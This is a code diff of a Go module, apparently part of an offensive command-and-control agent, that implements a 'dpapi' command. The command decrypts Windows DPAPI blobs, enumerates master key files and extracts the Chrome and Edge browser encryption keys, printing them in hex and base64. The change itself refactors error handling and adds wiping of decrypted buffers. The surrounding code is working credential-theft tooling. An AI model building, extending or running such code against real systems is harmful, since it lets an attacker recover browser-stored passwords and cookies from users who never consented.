@@ -35,11 +35,7 @@ type dpapiArgs struct {
 func (c *DpapiCommand) Execute(task structs.Task) structs.CommandResult {
 	var args dpapiArgs
 	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error parsing parameters: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error parsing parameters: %v", err)
 	}
 
 	if args.Action == "" {
@@ -54,31 +50,19 @@ func (c *DpapiCommand) Execute(task structs.Task) structs.CommandResult {
 	case "chrome-key":
 		return c.extractChromeKey()
 	default:
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: decrypt, masterkeys, chrome-key", args.Action),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Unknown action: %s. Use: decrypt, masterkeys, chrome-key", args.Action)
 	}
 }
 
 // decrypt decrypts a base64-encoded DPAPI blob using CryptUnprotectData
 func (c *DpapiCommand) decrypt(args dpapiArgs) structs.CommandResult {
 	if args.Blob == "" {
-		return structs.CommandResult{
-			Output:    "Error: -blob parameter required (base64-encoded DPAPI blob)",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("Error: -blob parameter required (base64-encoded DPAPI blob)")
 	}
 
 	data, err := base64.StdEncoding.DecodeString(args.Blob)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("Error decoding base64 blob: %v", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("Error decoding base64 blob: %v", err)
 	}
 
 	dataIn := windows.DataBlob{
@@ -91,11 +75,7 @@ func (c *DpapiCommand) decrypt(args dpapiArgs) structs.CommandResult {
 	if args.Entropy != "" {
 		entropyBytes, err := base64.StdEncoding.DecodeString(args.Entropy)
 		if err != nil {
-			return structs.CommandResult{
-				Output:    fmt.Sprintf("Error decoding entropy: %v", err),
-				Status:    "error",
-				Completed: true,
-			}
+			return errorf("Error decoding entropy: %v", err)
 		}
 		pEntropy = &windows.DataBlob{
 			Size: uint32(len(entropyBytes)),
@@ -105,16 +85,13 @@ func (c *DpapiCommand) decrypt(args dpapiArgs) structs.CommandResult {
 
 	err = windows.CryptUnprotectData(&dataIn, nil, pEntropy, 0, nil, 0, &dataOut)
 	if err != nil {
-		return structs.CommandResult{
-			Output:    fmt.Sprintf("CryptUnprotectData failed: %v\nNote: Decryption requires the same user context that encrypted the data.", err),
-			Status:    "error",
-			Completed: true,
-		}
+		return errorf("CryptUnprotectData failed: %v\nNote: Decryption requires the same user context that encrypted the data.", err)
 	}
 
 	result := make([]byte, dataOut.Size)
 	copy(result, unsafe.Slice(dataOut.Data, dataOut.Size))
 	windows.LocalFree(windows.Handle(unsafe.Pointer(dataOut.Data)))
+	defer structs.ZeroBytes(result)
 
 	var sb strings.Builder
 	sb.WriteString("=== DPAPI DECRYPTION RESULT ===\n\n")
@@ -129,11 +106,7 @@ func (c *DpapiCommand) decrypt(args dpapiArgs) structs.CommandResult {
 		sb.WriteString(fmt.Sprintf("Plaintext (b64): %s\n", base64.StdEncoding.EncodeToString(result)))
 	}
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // listMasterKeys enumerates DPAPI master key files
@@ -231,11 +204,7 @@ func (c *DpapiCommand) listMasterKeys(args dpapiArgs) structs.CommandResult {
 
 	sb.WriteString(fmt.Sprintf("\n--- Total: %d master key files found ---\n", totalKeys))
 
-	return structs.CommandResult{
-		Output:    sb.String(),
-		Status:    "success",
-		Completed: true,
-	}
+	return successResult(sb.String())
 }
 
 // extractChromeKey extracts the Chrome/Edge Local State encryption key via DPAPI
@@ -245,11 +214,7 @@ func (c *DpapiCommand) extractChromeKey() structs.CommandResult {
 
 	localAppData := os.Getenv("LOCALAPPDATA")
 	if localAppData == "" {
-		return structs.CommandResult{
-			Output:    "LOCALAPPDATA not set",
-			Status:    "error",
-			Completed: true,
-		}
+		return errorResult("LOCALAPPDATA not set")
 	}
 
 	browsers := map[string]string{
@@ -299,6 +264,7 @@ func (c *DpapiCommand) extractChromeKey() structs.CommandResult {
 			sb.WriteString(fmt.Sprintf("[%s] DPAPI decryption failed: %v\n", name, err))
 			continue
 		}
+		defer structs.ZeroBytes(plainKey)
 
 		keyHex := hex.EncodeToString(plainKey)
 		keyB64 := base64.StdEncoding.EncodeToString(plainKey)
